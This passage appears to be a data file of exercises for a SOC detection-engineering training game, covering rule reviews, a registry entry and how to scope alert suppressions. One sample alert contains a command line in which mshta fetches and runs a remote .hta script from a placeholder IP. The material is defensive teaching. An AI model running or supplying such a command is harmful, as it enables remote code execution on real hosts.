            fields: [{ k: "True positives", v: "1 (a purple test)" }, { k: "False positives", v: "1" }, { k: "Last tested", v: "2026-10-20" }, { k: "Owner", v: "SOC lead" }],
            context: "Quiet, and quiet for a good reason: you can see the test that proves it still works.",
            answer: "keep",
            why: "A review doesn't have to end in a change. Record the review date and the false positive rate, so the next person can see the rule was looked at.",
          },
          {
            id: "r6", time: "Q4 review", severity: "Low", rule: "UC-NET-0002 Telnet to the old crane gateway", entity: "0 alerts in 180 days",
            fields: [{ k: "Asset", v: "Gateway decommissioned 2026-04-30" }, { k: "Log source", v: "Removed with the gateway" }, { k: "Replacement", v: "New gateway covered by UC-NET-0041" }],
            context: "The thing this rule watched no longer exists, and another rule covers its replacement.",
            answer: "retire",
            why: "Retiring is the right call when the asset is gone and coverage is confirmed elsewhere. Set the status to disabled and record why, so nobody counts it as coverage. That's a very different thing from switching off a noisy rule that still has a job.",
          },
        ],
      },
      {
        kind: "anatomy",
        title: "The Registry Line",
        prompt: "This is what shipping means. UC-IMPACT-0001 went live on Friday, and the registry holds it, not a person's memory. When an auditor asks 'are you detecting shadow copy deletion?', Paloma reads out this line. Scan each field.",
        source: "Use Case Registry · shared, version controlled",
        fields: [
          { key: "Rule ID", value: "UC-IMPACT-0001", note: "Unique, so tickets, alerts and audits all point at one thing." },
          { key: "Name", value: "Volume Shadow Copies Deleted", note: "With a description of what it detects." },
          { key: "ATT&CK", value: "T1490 Inhibit System Recovery", note: "Lets you answer 'are we detecting this technique?' in seconds." },
          { key: "Data sources", value: "Sysmon Event ID 1, index=sysmon", note: "Change this source and you know which rules to retest." },
          { key: "Status", value: "active", note: "Active, disabled or in-testing." },
          { key: "Severity", value: "High, page on-call" },
          { key: "Tests passed", value: "Unit 2026-11-04, purple 2026-11-04, sector replay 2026-11-05", label: "The test", note: "Dates and types. An untested rule has no line here." },
          { key: "Tuning record", value: "hosts<=3, runs<=6. Precision 83%, recall 83%. Known miss: mass push across the fleet, see UC-IMPACT-0002. Accepted false positive: storage admin.", label: "The tuning record", note: "What was set, why, and what it still misses. Next quarter's reviewer needs this more than the query." },
          { key: "False positive rate", value: "About 0.25 a week", note: "One a month. If this climbs, the review will show it." },
          { key: "Last reviewed", value: "2026-11-06, next due 2027-02", note: "Quarterly, and again after every real incident: did it fire, and should it have?" },
          { key: "Owner", value: "Paloma Ferreira, Detection Engineering", label: "The owner", note: "One named owner: the person who answers when this rule breaks. A team name usually means nobody." },
          { key: "Playbook", value: "PB-014", note: "What the analyst does when it fires." },
        ],
        summary: "Logic got this rule into the SIEM. A test, a tuning record and an owner make it a use case. Take any of the three away and you are back to a query that happens to be running.",
      },
    ],
    // ── Boss warm-up: the context around a match, and exceptions that keep the rule's eyes open ──
    "ucd-log-1": [
      {
        kind: "anatomy",
        title: "Read Around the Match",
        prompt: "A rule match tells you why the alert exists. It doesn't tell you how worried to be. This one fired on a terminal PC last month, on a different rule. Read each field around the match, then weigh them together.",
        source: "SIEM alert · UC-ENDPOINT-0044 · MDA-OPS-07",
        fields: [
          { key: "rule.name", value: "Mshta-Execution", label: "Why it fired" },
          { key: "rule.mitre_technique", value: "T1218.005", label: "Technique", note: "System Binary Proxy Execution: Mshta. A signed Windows program running someone else's script." },
          { key: "process.name", value: "mshta.exe", label: "The match", note: "The rule matched on the image: mshta.exe ran. That is all the match says." },
          { key: "process.cmdline", value: "mshta.exe http://198.51.100.24/berth.hta", label: "What it did", note: "A script fetched from a bare IP address, not from a named site or an internal server. Weigh this one against the user below." },
          { key: "process.working_dir", value: "C:\\Users\\Public", label: "Where it ran", note: "Any signed-in user can write here. It does not show admin rights. Managed software on this PC runs from Program Files." },
          { key: "process.parent_name", value: "wscript.exe", label: "What started it", note: "The program that started this one. wscript.exe runs .vbs and .js script files, and terminal planners have no scripts in their job." },
          { key: "user.name", value: "k.sorensen", label: "Whose session", note: "A terminal planner, and nobody in that job runs mshta." },
          { key: "host.name", value: "MDA-OPS-07" },
        ],
        summary: "Take two fields: a planner whose job never calls for mshta, and a fetch from a bare IP. A developer testing an internal page would be one thing and a named vendor site another, but this user with this destination is hard to explain. No field settles it alone, so weigh them together, then ask what each remaining field adds and state only what it really shows.",
      },
      {
        kind: "sort",
        title: "Exception or Blind Spot?",
        prompt: "That same rule now floods: the customs clearance client runs mshta through its own updater on 30 Customs PCs, every Sunday. Someone has to quiet it. Test each proposed suppression with one question: would it also have hidden the alert you just read, or the next one like it?",
        buckets: [
          { id: "scoped", label: "Scoped exception" },
          { id: "blind", label: "Blind spot" },
        ],
        items: [
          { id: "s1", text: "Parent is exactly C:\\Program Files\\CustomsGate\\cgupdate.exe, and User is MERROW\\svc_cgate", bucket: "scoped", why: "Two exact facts describe one known job. The alert on MDA-OPS-07 matches neither, so it still fires." },
          { id: "s2", text: "Same parent and account, and only on Sundays from 02:00 to 03:00", bucket: "scoped", why: "A time window shrinks it further. Anything outside the job's own hour alerts, even from that account." },
          { id: "b1", text: "Parent is wscript.exe", bucket: "blind", why: "This silences the very alert you read, and it does nothing for the customs job, whose parent is cgupdate.exe. Script-host abuse often looks exactly like this." },
          { id: "b2", text: "Host is in the Customs organisational unit", bucket: "blind", why: "Those 30 PCs are now invisible to this rule, whoever is on them. Attackers love an excluded host." },
          { id: "b3", text: "Command line contains http://", bucket: "blind", why: "The customs job would be hidden, and so would the attack: the alert you read fetched over http:// too." },
          { id: "b4", text: "User is in the Customs team", bucket: "blind", why: "A team is a lot of passwords. One phished clerk and the rule looks the other way." },
          { id: "b5", text: "Image is mshta.exe", bucket: "blind", why: "That is the rule switched off under another name." },
        ],
      },
    ],
  },
};
